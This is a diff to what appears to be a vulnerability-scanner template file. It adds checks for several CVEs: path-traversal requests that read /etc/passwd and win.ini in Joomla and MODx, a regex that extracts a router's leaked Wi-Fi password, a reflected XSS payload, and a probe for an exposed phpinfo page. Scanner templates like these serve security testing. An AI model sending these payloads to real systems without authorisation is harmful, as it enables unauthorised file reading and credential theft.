@@ -660,6 +660,74 @@
       ]
     },
     {
+      "id": "CVE-2010-1353",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the LoginBox Pro (com_loginbox) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the view parameter to index.php.",
+        "name": "Joomla! Component LoginBox - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/12068\n- https://www.cvedetails.com/cve/CVE-2010-1353\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_loginbox&view=../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1955",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Deluxe Blog Factory (com_blogfactory) component 1.1.2 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Deluxe Blog Factory 1.1.2 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/12238\n- https://www.cvedetails.com/cve/CVE-2010-1955\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_blogfactory&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1979",
       "info": {
         "author": "daffainfo",
@@ -930,6 +998,44 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_jotloader&section=../../../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-5278",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in manager/controllers/default/resource/tvs.php in MODx Revolution 2.0.2-pl, and possibly earlier, when magic_quotes_gpc is disabled, allows remote attackers to read arbitrary files via a .. (dot dot) in the class_key parameter.",
+        "name": "MODx manager - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/34788\n- https://www.cvedetails.com/cve/CVE-2010-5278\n",
+        "severity": "high",
+        "tags": "cve,cve2010,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "bit app support",
+                "fonts",
+                "extensions"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../windows/win.ini%00"
           ]
         }
       ]
@@ -11777,7 +11883,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/../../../../../../../../../../../Windows/win.ini"
+            "{{BaseURL}}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini"
           ]
         }
       ]
@@ -21901,6 +22007,52 @@
       ]
     },
     {
+      "id": "CVE-2021-3017",
+      "info": {
+        "author": "pikpikcu",
+        "description": "The web interface on Intelbras WIN 300 and WRN 342 devices through 2021-01-04 allows remote attackers to discover credentials by reading the def_wirelesspassword line in the HTML source code.",
+        "name": "Intelbras WIN 300/WRN 342 Disclosure",
+        "reference": "- https://poc.wgpsec.org/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Intelbras/Intelbras%20Wireless%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%20CVE-2021-3017.html\n- https://nvd.nist.gov/vuln/detail/CVE-2021-3017\n",
+        "severity": "high",
+        "tags": "cve,cve2021,exposure,router"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "part": "body",
+              "regex": [
+                "def_wirelesspassword = \"([A-Za-z0-9=]+)\";"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "def_wirelesspassword =",
+                "<title>Roteador Wireless</title>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.asp"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-3019",
       "info": {
         "author": "pikpikcu",
@@ -22936,6 +23088,96 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/http_header.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-37573",
+      "info": {
+        "author": "geeknik",
+        "name": "Tiny Java Web Server - Reflected XSS",
+        "reference": [
+          "https://seclists.org/fulldisclosure/2021/Aug/13"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,xss,tjws"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                404
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<H2>404 te<img src=x onerror=alert(42)>st not found</H2>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/te%3Cimg%20src=x%20onerror=alert(42)%3Est"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-37704",
+      "info": {
+        "author": "whoever",
+        "description": "phpinfo() exposure in unprotected composer vendor folder via phpfastcache/phpfastcache.",
+        "name": "phpfastcache phpinfo exposure",
+        "reference": "https://github.com/PHPSocialNetwork/phpfastcache/pull/813\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37704\n",
+        "severity": "low",
+        "tags": "cve,cve2021,exposure,phpfastcache"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "group": 1,
+              "part": "body",
+              "regex": [
+                ">PHP Version <\\/td><td class=\"v\">([0-9.]+)"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "PHP Extension",
+                "PHP Version"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/vendor/phpfastcache/phpfastcache/docs/examples/phpinfo.php",
+            "{{BaseURL}}/vendor/phpfastcache/phpfastcache/examples/phpinfo.php"
           ]
         }
       ]
